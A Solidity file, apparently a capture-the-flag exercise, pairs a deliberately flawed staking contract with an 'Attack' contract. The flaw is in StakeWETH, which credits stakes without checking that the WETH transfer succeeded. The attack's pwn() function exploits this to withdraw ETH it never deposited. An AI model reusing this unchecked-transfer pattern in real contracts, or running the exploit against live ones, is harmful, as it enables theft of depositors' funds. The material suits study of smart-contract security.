// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract Stake {

    uint256 public totalStaked;
    mapping(address => uint256) public UserStake;
    mapping(address => bool) public Stakers;
    address public WETH;

    constructor(address _weth) payable{
        totalStaked += msg.value;
        WETH = _weth;
    }

    function StakeETH() public payable {
        require(msg.value > 0.001 ether, "Don't be cheap");
        totalStaked += msg.value;
        UserStake[msg.sender] += msg.value;
        Stakers[msg.sender] = true;
    }
    function StakeWETH(uint256 amount) public returns (bool){
        require(amount >  0.001 ether, "Don't be cheap");
        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
        require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
        totalStaked += amount;
        UserStake[msg.sender] += amount;
        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
        Stakers[msg.sender] = true;
        return transfered;
    }

    function Unstake(uint256 amount) public returns (bool){
        require(UserStake[msg.sender] >= amount,"Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success, ) = payable(msg.sender).call{value : amount}("");
        return success;
    }
    function bytesToUint(bytes memory data) internal pure returns (uint256) {
        require(data.length >= 32, "Data length must be at least 32 bytes");
        uint256 result;
        assembly {
            result := mload(add(data, 0x20))
        }
        return result;
    }
}

contract Attack {
    Stake public stake;
    WETH public weth;

    constructor(WETH _weth, Stake _stake) {
        weth = _weth;
        stake = _stake;
    }

    function pwn() external payable {
        (bool approve, ) = address(weth).call(abi.encodeWithSignature("approve(address,uint256)", stake, type(uint256).max));
        require(approve, "approved failed");

        (bool stakeWeth, ) = address(stake).call(abi.encodeWithSignature("StakeWETH(uint256)", 0.001 ether + 1));
        require(stakeWeth, "stakeWeth failed");

        (bool stakeEth, ) = address(stake).call{value: 0.001 ether + 2}(abi.encodeWithSignature("StakeETH()"));
        require(stakeEth, "stakeEth failed");

        (bool unstake, ) = address(stake).call(abi.encodeWithSignature("Unstake(uint256)", 0.001 ether));
        require(unstake, "unstake failed");

    }

}

contract WETH is ERC20 {
    Stake public stake;

    constructor(Stake _stake) ERC20("weth", "WETH") {
        stake = _stake;
        _mint(msg.sender, 1000);
    }

    function mint(address stake) public {
        _mint(stake, 1000);
    }

}